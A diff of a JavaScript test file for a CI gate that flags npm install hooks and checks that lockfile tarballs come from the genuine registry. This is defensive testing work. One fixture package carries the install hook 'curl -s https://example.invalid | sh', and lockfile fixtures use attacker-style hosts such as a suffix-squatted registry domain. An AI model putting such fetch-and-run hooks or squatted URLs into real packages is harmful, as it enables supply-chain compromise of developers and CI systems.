@@ -14,8 +14,8 @@ import {
 
 // The install-script gate is the only thing standing between a compromised dev
 // dependency and code execution on every `npm ci`. Test it like any other
-// security control: a tree where it must fire and a tree where it must stay
-// quiet — plus the URL shapes that tried to impersonate the public registry.
+// security control: a tree where it must fire, a tree where it must stay quiet,
+// and the URL shapes that tried to impersonate the public registry.
 
 const root = mkdtempSync(path.join(tmpdir(), 'install-scripts-'));
 const nodeModules = path.join(root, 'node_modules');
@@ -31,10 +31,10 @@ packageDir('hooked-postinstall', { postinstall: 'node install.js' });
 packageDir('hooked-preinstall', { preinstall: 'sh pre.sh' });
 packageDir('hooked-install', { install: 'echo hi' });
 packageDir('@scope/hooked', { postinstall: 'node -e 0' });
-packageDir('gyp-native', {}); // binding.gyp below — implicit node-gyp rebuild
+packageDir('gyp-native', {}); // `binding.gyp` below — implicit node-gyp rebuild
 writeFileSync(path.join(nodeModules, 'gyp-native', 'binding.gyp'), '{}');
 packageDir('gyp-flagged', {}, { gypfile: true });
-packageDir('clean', { build: 'tsc', prepare: 'husky', test: 'vitest' }); // hooks that do NOT run on install
+packageDir('clean', { build: 'tsc', prepare: 'husky', test: 'vitest' }); // `prepare`/`build`/`test` never run on install
 packageDir('empty-hook', { postinstall: '' });
 const parent = packageDir('parent', {});
 packageDir('nested-hooked', { install: 'curl -s https://example.invalid | sh' }, {}, parent);
@@ -62,7 +62,7 @@ describe('collectInstallScripts', () => {
 
   it('ignores scripts that never run on install, empty hooks, and unreadable manifests', () => {
     const found = collectInstallScripts(nodeModules).map((p) => p.name);
-    expect(found).not.toContain('clean'); // prepare/build/test are not install hooks
+    expect(found).not.toContain('clean'); // `prepare`/`build`/`test` are not install hooks
     expect(found).not.toContain('empty-hook');
     expect(found).not.toContain('broken');
     expect(found).not.toContain('parent');
@@ -85,9 +85,9 @@ describe('collectInstallScripts', () => {
 
   it('does not follow symlinks, so a self-referential link cannot hang or blow the stack', () => {
     // `npm link`, a `file:` dependency, or a stray link back into the tree made
-    // the walker recurse into itself until the CI step died with a stack
-    // overflow — a tooling crash instead of an allowlist verdict. Such packages
-    // are caught by the lockfile's `non-registry-dep` rule instead.
+    // the walker recurse until the CI step died with a stack overflow — a
+    // tooling crash instead of an allowlist verdict. The lockfile's
+    // `non-registry-dep` rule catches such packages instead.
     const tree = mkdtempSync(path.join(tmpdir(), 'install-scripts-links-'));
     packageDir('hooked-postinstall', { postinstall: 'node install.js' }, {}, tree);
     packageDir('child', { install: 'sh x.sh' }, {}, tree);
@@ -104,9 +104,9 @@ describe('collectInstallScripts', () => {
 
   it('keeps a nested duplicate at a second version as its own flagged entry', () => {
     // The npm-worm shape this gate exists to catch: the reviewed package at its
-    // allowlisted version plus an unreviewed nested copy at another. Merging
-    // by name alone folds the second entry into the first; name@version keying
-    // (and per-directory reporting) keeps compare() able to see the intruder.
+    // allowlisted version plus an unreviewed nested copy at another. Name-only
+    // merging folds the second into the first; `name@version` keying (and
+    // per-directory reporting) keeps `compare()` able to see the intruder.
     const tree = mkdtempSync(path.join(tmpdir(), 'install-scripts-dup-'));
     packageDir('reviewed-pkg', { postinstall: 'node install.js' }, {}, tree);
     packageDir('host-pkg', {}, {}, tree);
@@ -118,10 +118,9 @@ describe('collectInstallScripts', () => {
     );
     const nm = path.join(tree, 'node_modules');
 
-    // Exercise collectAll — the name@version merge keying is the thing under
-    // test; name-keyed merging would fold 9.9.9 into the 1.2.3 entry before
-    // compare() ever sees the intruder (collectInstallScripts alone would pass
-    // either way, since it reports per-directory).
+    // `collectAll` is the subject: name-keyed merging would fold 9.9.9 into the
+    // 1.2.3 entry before `compare()` ever sees the intruder
+    // (`collectInstallScripts` reports per-directory, so it passes either way).
     const merged = collectAll(nm);
     const found = merged
       .filter((p) => p.name === 'reviewed-pkg')
@@ -129,9 +128,8 @@ describe('collectInstallScripts', () => {
       .sort();
     expect(found).toEqual(['reviewed-pkg@1.2.3', 'reviewed-pkg@9.9.9']);
 
-    // compare() over the full merged set — the repository's own lock entries
-    // are in there too (legitimately allowlisted elsewhere), so only the
-    // intruder's problems matter here.
+    // The repository's own (legitimately allowlisted) lock entries ride along
+    // in the merged set, so only the intruder's problems matter here.
     const { problems } = compare(merged, { 'reviewed-pkg': '1.2.3' });
     expect(problems.filter((p) => p.includes('reviewed-pkg'))).toEqual([
       expect.stringContaining('reviewed-pkg@9.9.9'),
@@ -149,8 +147,8 @@ describe('collectFromLockfile', () => {
       'node_modules/@scope/native': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/@scope/native/-/native-1.0.0.tgz' },
       'node_modules/@scope/native/node_modules/dup': { version: '0.1.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/dup/-/dup-0.1.0.tgz' },
       'node_modules/clean-dep': { version: '3.0.0', resolved: 'https://registry.npmjs.org/clean-dep/-/clean-dep-3.0.0.tgz' },
-      // git / file / link dependencies run `prepare` on install and have no
-      // published manifest, so hasInstallScript never flags them.
+      // git/file/link dependencies run `prepare` on install and have no
+      // published manifest, so `hasInstallScript` never flags them.
       'node_modules/from-git': { version: '1.0.0', resolved: 'git+ssh://git@github.com/evil/helper.git#abc' },
       'node_modules/from-github-shorthand': { version: '1.0.0', resolved: 'github:evil/helper' },
       'node_modules/from-local': { version: '1.0.0', resolved: 'file:../helper' },
@@ -158,8 +156,8 @@ describe('collectFromLockfile', () => {
       'node_modules/from-mirror': { version: '1.0.0', resolved: 'https://mirror.attacker.invalid/pkg.tgz' },
       // Suffix-squats the public registry to dodge a loose `registry.` check.
       'node_modules/suffix-squat': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org.evil.invalid/x/-/x-1.0.0.tgz' },
-      // The real registry, but the tarball path belongs to another package:
-      // origin-only checks call this genuine provenance.
+      // Real registry origin, but the tarball path belongs to another package —
+      // origin-only checks call this genuine.
       'node_modules/name-swap': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/attacker/-/name-swap-1.0.0.tgz' },
       // No `resolved` at all: nothing to verify against, so fail closed.
       'node_modules/no-resolved': { version: '1.0.0', hasInstallScript: true }
@@ -187,10 +185,10 @@ describe('collectFromLockfile', () => {
 
   it('accepts only the exact registry origin: genuine tarballs carry hasInstallScript alone, squats carry both labels', () => {
     const byName = Object.fromEntries(collectFromLockfile(lock).map((p) => [p.name, p.hooks]));
-    // The one host the allowlist reviews tarballs against must pass cleanly…
+    // The one host the allowlist reviews tarballs against must pass cleanly.
     expect(byName['esbuild']).toEqual(['hasInstallScript']);
     expect(byName['@scope/native']).toEqual(['hasInstallScript']);
-    // …and a suffix-squat of it must not be treated as genuine.
+    // And a suffix-squat of it must not be treated as genuine.
     expect(byName['suffix-squat']).toEqual(['hasInstallScript', 'non-registry-dep']);
     // Registry *origin* is not registry *provenance*: the tarball path must
     // belong to the entry's own name, and a missing `resolved` fails closed.
@@ -258,9 +256,9 @@ describe('isRegistryTarballFor', () => {
 
 describe('compare — provenance is part of the verdict', () => {
   it('never lets an allowlisted name pass on non-registry bytes', () => {
-    // The High-severity bypass this closes: same name, same reviewed version,
-    // but the lockfile fetches the payload from somewhere the allowlist never
-    // reviewed. Name+version matching alone let this through silently.
+    // The High-severity bypass this closes: reviewed name and version, but the
+    // lockfile fetches the payload from somewhere the allowlist never reviewed
+    // — name+version matching alone let this through silently.
     const swapped = [{ name: 'esbuild', version: '0.27.2', hooks: ['hasInstallScript', 'non-registry-dep'] }];
     const { problems } = compare(swapped, { esbuild: '0.27.2' });
     expect(problems).toHaveLength(1);
@@ -287,7 +285,7 @@ describe('compare', () => {
   });
 
   it('flags an allowlisted package whose version moved, because that script was never reviewed', () => {
-    // Name-only matching would let a compromised esbuild release run anything.
+    // Name-only matching would let a compromised `esbuild` release run anything.
     const { problems } = compare([{ name: 'esbuild', version: '9.9.9-evil', hooks: ['postinstall'] }], { esbuild: '0.27.2' });
     expect(problems).toHaveLength(1);
     expect(problems[0]).toContain('esbuild@9.9.9-evil');
@@ -303,8 +301,8 @@ describe('compare', () => {
   });
 
   it('treats an allowlisted package that is not installed as a note, not a failure', () => {
-    // Optional deps are platform-specific (fsevents on macOS only), so a superset
-    // allowlist must stay green on the ubuntu runner.
+    // Optional deps are platform-specific (`fsevents` on macOS only), so a
+    // superset allowlist must stay green on the ubuntu runner.
     const { problems, stale } = compare([found[0]], { esbuild: '0.27.2', 'platform-only': '1.0.0' });
     expect(problems).toEqual([]);
     expect(stale).toEqual(['platform-only']);
